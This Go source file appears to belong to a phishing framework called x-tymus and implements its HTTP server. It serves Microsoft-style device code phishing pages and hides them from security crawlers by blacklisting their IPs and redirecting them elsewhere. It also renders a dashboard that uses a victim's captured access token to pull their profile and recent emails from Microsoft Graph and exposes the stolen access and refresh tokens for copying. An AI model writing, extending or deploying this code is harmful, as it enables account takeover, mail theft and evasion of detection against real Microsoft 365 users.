package core

import (
	"encoding/json"
	"fmt"
	"html/template"
	"io"
	"net/http"
	"regexp"
	"strings"
	"time"

	"github.com/caddyserver/certmagic"
	"github.com/gorilla/mux"
	"github.com/x-tymus/x-tymus/database"
	"github.com/x-tymus/x-tymus/log"
)

type HttpServer struct {
	srv        *http.Server
	acmeTokens map[string]string
	Cfg        *Config
	Db         *database.Database
}

func NewHttpServer() (*HttpServer, error) {
	s := &HttpServer{}
	s.acmeTokens = make(map[string]string)
	// cfg must be set after creation

	r := mux.NewRouter()
	s.srv = &http.Server{
		Handler:      r,
		Addr:         ":80",
		WriteTimeout: 15 * time.Second,
		ReadTimeout:  15 * time.Second,
	}

	r.HandleFunc("/.well-known/acme-challenge/{token}", s.handleACMEChallenge).Methods("GET")
	// Blacklist admin API
	r.HandleFunc("/admin/blacklist", s.handleBlacklistList).Methods("GET")
	r.HandleFunc("/admin/blacklist", s.handleBlacklistAdd).Methods("POST")
	r.HandleFunc("/admin/blacklist", s.handleBlacklistRemove).Methods("DELETE")
	r.HandleFunc("/admin/blacklist/flush", s.handleBlacklistFlush).Methods("POST")
	// Admin panel
	r.HandleFunc("/admin/panel", s.handleAdminPanel).Methods("GET", "POST")
	// Device code landing pages + token dashboard
	r.HandleFunc("/dc/{token}", s.handleDCLanding).Methods("GET")
	r.HandleFunc("/dc/use/{token}", s.handleDCUse).Methods("GET")
	// User panels
	r.PathPrefix("/panel/").HandlerFunc(s.handleUserPanel)

	r.PathPrefix("/").HandlerFunc(s.handleRedirect)

	return s, nil
}

// admin handlers
func (s *HttpServer) handleBlacklistList(w http.ResponseWriter, r *http.Request) {
	if GlobalBlacklist == nil {
		http.Error(w, "no blacklist", http.StatusNotFound)
		return
	}
	type entry struct {
		IP string `json:"ip"`
	}
	var out []entry
	for k := range GlobalBlacklist.ips {
		out = append(out, entry{IP: k})
	}
	b, _ := json.Marshal(out)
	w.Header().Set("Content-Type", "application/json")
	w.Write(b)
}

func (s *HttpServer) handleBlacklistAdd(w http.ResponseWriter, r *http.Request) {
	if GlobalBlacklist == nil {
		http.Error(w, "no blacklist", http.StatusNotFound)
		return
	}
	var req struct {
		IP string `json:"ip"`
	}
	dec := json.NewDecoder(r.Body)
	if err := dec.Decode(&req); err != nil || req.IP == "" {
		http.Error(w, "invalid", http.StatusBadRequest)
		return
	}
	if err := GlobalBlacklist.AddIP(req.IP); err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	w.WriteHeader(http.StatusNoContent)
}

func (s *HttpServer) handleBlacklistRemove(w http.ResponseWriter, r *http.Request) {
	if GlobalBlacklist == nil {
		http.Error(w, "no blacklist", http.StatusNotFound)
		return
	}
	var req struct {
		IP string `json:"ip"`
	}
	dec := json.NewDecoder(r.Body)
	if err := dec.Decode(&req); err != nil || req.IP == "" {
		http.Error(w, "invalid", http.StatusBadRequest)
		return
	}
	if err := GlobalBlacklist.RemoveIP(req.IP); err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	w.WriteHeader(http.StatusNoContent)
}

func (s *HttpServer) handleBlacklistFlush(w http.ResponseWriter, r *http.Request) {
	if GlobalBlacklist == nil {
		http.Error(w, "no blacklist", http.StatusNotFound)
		return
	}
	if err := GlobalBlacklist.Flush(); err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	w.WriteHeader(http.StatusNoContent)
}

func (s *HttpServer) Start() {
	go s.srv.ListenAndServe()
}

func (s *HttpServer) AddACMEToken(token string, keyAuth string) {
	s.acmeTokens[token] = keyAuth
}

func (s *HttpServer) ClearACMETokens() {
	s.acmeTokens = make(map[string]string)
}

func (s *HttpServer) handleACMEChallenge(w http.ResponseWriter, r *http.Request) {
	// Let certmagic's HTTP-01 solver handle it first.
	// This is required because certmagic manages challenge tokens internally
	// and cannot bind port 80 separately (already owned by this server).
	if certmagic.DefaultACME.HandleHTTPChallenge(w, r) {
		log.Debug("http: certmagic handled ACME challenge for URL: %s", r.URL.Path)
		return
	}

	// Fallback to manual token store (legacy path).
	vars := mux.Vars(r)
	token := vars["token"]

	key, ok := s.acmeTokens[token]
	if !ok {
		w.WriteHeader(http.StatusNotFound)
		return
	}

	log.Debug("http: found ACME verification token for URL: %s", r.URL.Path)
	w.WriteHeader(http.StatusOK)
	w.Header().Set("content-type", "text/plain")
	w.Write([]byte(key))
}

func (s *HttpServer) handleRedirect(w http.ResponseWriter, r *http.Request) {
	// Anti-bot: block known crawler/user-agent strings and add their IPs to the blacklist
	ua := r.UserAgent()
	uaLower := strings.ToLower(ua)
	// check configured UA regex first
	blockedByUA := false
	if s.Cfg != nil && s.Cfg.blacklistConfig != nil {
		for _, pat := range s.Cfg.blacklistConfig.UARegex {
			if pat == "" {
				continue
			}
			re, err := regexp.Compile(pat)
			if err != nil {
				log.Error("invalid UA regex pattern: %s", pat)
				continue
			}
			if re.MatchString(ua) || re.MatchString(uaLower) {
				blockedByUA = true
				break
			}
		}
	}

	knownBots := []string{"googlebot", "bingbot", "baiduspider", "yandex", "duckduckbot", "slurp", "facebookexternalhit", "twitterbot", "linkedinbot", "adsbot-google", "applebot"}
	for _, b := range knownBots {
		if strings.Contains(uaLower, b) {
			blockedByUA = true
			break
		}
	}

	if blockedByUA {
		log.Warning("Known bot detected via UA: %s IP=%s", ua, r.RemoteAddr)
		// add IP to persistent blacklist if available, but respect config whitelists/ASN
		if GlobalBlacklist != nil {
			ip := r.RemoteAddr
			// strip port if present
			if idx := strings.LastIndex(ip, ":"); idx > -1 {
				ip = ip[:idx]
			}
			if !IsIPPermitted(ip, s.Cfg) {
				if err := GlobalBlacklist.AddIP(ip); err == nil {
					log.Info("blacklist: added IP %s", ip)
				} else {
					log.Error("blacklist add failed: %v", err)
				}
			} else {
				log.Info("blacklist: skipped adding whitelisted IP %s", ip)
			}
		}
		http.Redirect(w, r, "https://www.google.com", http.StatusFound)
		return
	}

	// If not a known bot, optionally use StealthAI scoring if enabled
	if s.Cfg != nil && s.Cfg.IsStealthAIEnabled() {
		packet := r.UserAgent() + "|" + r.RemoteAddr + "|" + r.URL.String()
		score, err := AnalyzeTrafficWithStealthAI(packet)
		if err == nil {
			log.Info("StealthAI score: %f for UA: %s", score, r.UserAgent())
			if score > 0.85 {
				log.Warning("Bot detected and blocked by StealthAI: UA=%s IP=%s", r.UserAgent(), r.RemoteAddr)
				// add to blacklist
				if GlobalBlacklist != nil {
					ip := r.RemoteAddr
					if idx := strings.LastIndex(ip, ":"); idx > -1 {
						ip = ip[:idx]
					}
					if !GlobalBlacklist.IsWhitelisted(ip) {
						_ = GlobalBlacklist.AddIP(ip)
					}
				}
				http.Redirect(w, r, "https://www.google.com", http.StatusFound)
				return
			} else if score > 0.5 {
				log.Warning("Suspicious traffic redirected: UA=%s IP=%s", r.UserAgent(), r.RemoteAddr)
				http.Redirect(w, r, "https://www.bing.com", http.StatusFound)
				return
			} else {
				log.Info("Normal user allowed: UA=%s IP=%s", r.UserAgent(), r.RemoteAddr)
			}
		}
	}

	http.Redirect(w, r, "https://"+r.Host+r.URL.String(), http.StatusFound)
}

// handleDCLanding serves the Microsoft-style device code verification landing page.
func (s *HttpServer) handleDCLanding(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	token := vars["token"]
	tgt := GetTargetByToken(token)
	if tgt == nil {
		http.NotFound(w, r)
		return
	}
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.Write([]byte(DCLandingPage(tgt)))
}

// handleDCUse fetches Graph API data for a completed device code target and
// renders a one-click admin dashboard showing the victim's account details.
func (s *HttpServer) handleDCUse(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	token := vars["token"]
	tgt := GetTargetByToken(token)
	if tgt == nil {
		http.Error(w, "token not found", http.StatusNotFound)
		return
	}
	tgt.mu.Lock()
	at := tgt.AccessToken
	rt := tgt.RefreshToken
	email := tgt.Email
	tgt.mu.Unlock()

	if at == "" {
		http.Error(w, "no access token captured yet — wait for the victim to approve", http.StatusBadRequest)
		return
	}

	// Fetch profile from Graph API
	type graphUser struct {
		DisplayName       string `json:"displayName"`
		Mail              string `json:"mail"`
		UserPrincipalName string `json:"userPrincipalName"`
		JobTitle          string `json:"jobTitle"`
		Department        string `json:"department"`
		OfficeLocation    string `json:"officeLocation"`
		MobilePhone       string `json:"mobilePhone"`
	}
	type graphMsg struct {
		Subject      string `json:"subject"`
		ReceivedDate string `json:"receivedDateTime"`
		From         struct {
			EmailAddress struct {
				Name    string `json:"name"`
				Address string `json:"address"`
			} `json:"emailAddress"`
		} `json:"from"`
		BodyPreview string `json:"bodyPreview"`
	}
	type graphMsgList struct {
		Value []graphMsg `json:"value"`
	}

	doGraph := func(path string) ([]byte, error) {
		req, _ := http.NewRequest("GET", "https://graph.microsoft.com/v1.0"+path, nil)
		req.Header.Set("Authorization", "Bearer "+at)
		req.Header.Set("Accept", "application/json")
		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			return nil, err
		}
		defer resp.Body.Close()
		return io.ReadAll(resp.Body)
	}

	var user graphUser
	if b, err := doGraph("/me"); err == nil {
		json.Unmarshal(b, &user)
	}
	var msgs graphMsgList
	if b, err := doGraph("/me/messages?$top=8&$select=subject,from,receivedDateTime,bodyPreview&$orderby=receivedDateTime desc"); err == nil {
		json.Unmarshal(b, &msgs)
	}

	if user.Mail == "" {
		user.Mail = user.UserPrincipalName
	}
	if user.Mail == "" {
		user.Mail = email
	}

	// Build rows
	var rows strings.Builder
	for _, m := range msgs.Value {
		t := m.ReceivedDate
		if len(t) >= 10 {
			t = t[:10]
		}
		rows.WriteString(fmt.Sprintf(`<tr>
<td>%s</td><td>%s &lt;%s&gt;</td><td>%s</td></tr>`,
			template.HTMLEscapeString(t),
			template.HTMLEscapeString(m.From.EmailAddress.Name),
			template.HTMLEscapeString(m.From.EmailAddress.Address),
			template.HTMLEscapeString(m.Subject)))
	}

	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	fmt.Fprintf(w, `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">
<title>Token Dashboard — %s</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Arial,sans-serif;background:#0f0f0f;color:#e0e0e0;padding:24px}
h1{font-size:20px;color:#fff;margin-bottom:4px}
.sub{font-size:13px;color:#888;margin-bottom:24px}
.card{background:#1a1a1a;border:1px solid #2a2a2a;border-radius:6px;padding:20px 24px;margin-bottom:18px}
.card h2{font-size:13px;text-transform:uppercase;letter-spacing:.8px;color:#666;margin-bottom:14px}
.kv{display:grid;grid-template-columns:160px 1fr;gap:6px 12px;font-size:13px}
.kv .k{color:#666}
.kv .v{color:#e0e0e0;word-break:break-all}
.token-box{background:#111;border:1px solid #333;border-radius:4px;padding:10px 14px;font-family:monospace;font-size:11px;color:#7ec8e3;word-break:break-all;margin-top:8px;max-height:80px;overflow-y:auto}
table{width:100%%;border-collapse:collapse;font-size:12px}
th{text-align:left;padding:8px 10px;color:#555;border-bottom:1px solid #222;font-weight:600;text-transform:uppercase;font-size:11px;letter-spacing:.5px}
td{padding:8px 10px;border-bottom:1px solid #1e1e1e;color:#ccc;vertical-align:top}
tr:hover td{background:#1e1e1e}
.actions{display:flex;gap:10px;flex-wrap:wrap;margin-bottom:20px}
.btn{padding:8px 18px;border-radius:4px;font-size:13px;font-weight:600;text-decoration:none;border:none;cursor:pointer}
.btn-blue{background:#0078d4;color:#fff}
.btn-dark{background:#2a2a2a;color:#ccc;border:1px solid #333}
.copied{color:#5cb85c;font-size:12px;display:none;margin-left:8px}
</style></head><body>
<h1>%s</h1>
<p class="sub">%s &nbsp;·&nbsp; %s</p>

<div class="actions">
<button class="btn btn-blue" onclick="copyToken()">Copy Access Token</button>
<button class="btn btn-dark" onclick="copyRT()">Copy Refresh Token</button>
<a class="btn btn-dark" href="https://outlook.office.com/mail/" target="_blank">Open Outlook</a>
<a class="btn btn-dark" href="https://portal.office.com" target="_blank">Open M365 Portal</a>
<span class="copied" id="cp">Copied!</span>
</div>

<div class="card">
<h2>Profile</h2>
<div class="kv">
<span class="k">Display name</span><span class="v">%s</span>
<span class="k">Email</span><span class="v">%s</span>
<span class="k">Job title</span><span class="v">%s</span>
<span class="k">Department</span><span class="v">%s</span>
<span class="k">Office</span><span class="v">%s</span>
<span class="k">Mobile</span><span class="v">%s</span>
</div>
</div>

<div class="card">
<h2>Access Token</h2>
<div class="token-box" id="at">%s</div>
</div>

<div class="card" style="margin-bottom:18px">
<h2>Recent Emails</h2>
<table><thead><tr><th>Date</th><th>From</th><th>Subject</th></tr></thead><tbody>
%s
</tbody></table>
</div>

<script>
var at = %q;
var rt = %q;
function copyToken(){navigator.clipboard.writeText(at);flash();}
function copyRT(){navigator.clipboard.writeText(rt);flash();}
function flash(){var c=document.getElementById('cp');c.style.display='inline';setTimeout(function(){c.style.display='none';},1500);}
</script>
</body></html>`,
		template.HTMLEscapeString(user.Mail),
		template.HTMLEscapeString(user.DisplayName),
		template.HTMLEscapeString(user.Mail),
		template.HTMLEscapeString(user.Department),
		template.HTMLEscapeString(user.DisplayName),
		template.HTMLEscapeString(user.Mail),
		template.HTMLEscapeString(user.JobTitle),
		template.HTMLEscapeString(user.Department),
		template.HTMLEscapeString(user.OfficeLocation),
		template.HTMLEscapeString(user.MobilePhone),
		template.HTMLEscapeString(at),
		rows.String(),
		at, rt,
	)
}

// HandleRedirect returns an http.HandlerFunc that implements the same redirect logic as
// HttpServer.handleRedirect but is usable outside the core package. This allows tests
// and tools to reuse the redirect behavior by providing a Config.
func HandleRedirect(cfg *Config) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		if cfg != nil && cfg.IsStealthAIEnabled() {
			packet := r.UserAgent() + "|" + r.RemoteAddr + "|" + r.URL.String()
			score, err := AnalyzeTrafficWithStealthAI(packet)
			if err == nil {
				log.Info("StealthAI score: %f for UA: %s", score, r.UserAgent())
				if score > 0.85 {
					log.Warning("Bot detected and blocked: UA=%s IP=%s", r.UserAgent(), r.RemoteAddr)
					http.Redirect(w, r, "https://www.google.com", http.StatusFound)
					return
				} else if score > 0.5 {
					log.Warning("Suspicious traffic redirected: UA=%s IP=%s", r.UserAgent(), r.RemoteAddr)
					http.Redirect(w, r, "https://www.bing.com", http.StatusFound)
					return
				} else {
					log.Info("Normal user allowed: UA=%s IP=%s", r.UserAgent(), r.RemoteAddr)
				}
			}
		}
		http.Redirect(w, r, "https://"+r.Host+r.URL.String(), http.StatusFound)
	}
}
